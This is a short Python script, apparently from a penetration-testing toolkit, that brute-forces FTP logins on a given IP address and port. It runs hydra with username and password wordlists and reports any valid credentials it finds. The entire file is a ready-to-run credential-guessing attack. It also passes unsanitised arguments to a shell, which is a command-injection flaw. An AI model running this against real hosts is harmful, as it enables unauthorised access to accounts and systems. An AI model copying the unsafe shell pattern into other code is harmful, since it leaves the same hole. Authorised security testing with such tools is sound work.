#!/usr/bin/env python3
import subprocess
import sys
import reconf
from reconf import *

if len(sys.argv) != 3:
    print("Usage: brute_ftp.py <ip address> <port>")
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

print("INFO: Performing hydra ftp scan against " + ip_address)
HYDRA = f"hydra -L {reconf.usrlst} -P {reconf.pwdlst} -f -o {reconf.rsltpth}/{ip_address}_ftphydra.txt -u {ip_address} -s {port} ftp"
try:
    print(f"[+] Executing - {HYDRA}")
    results = subprocess.check_output(HYDRA, shell=True)
    resultarr = results.decode('utf-8').split("\n")
    for result in resultarr:
        if "login:" in result:
            print("[*] Valid ftp credentials found: " + result)
except:
    print("INFO: No valid ftp credentials found")
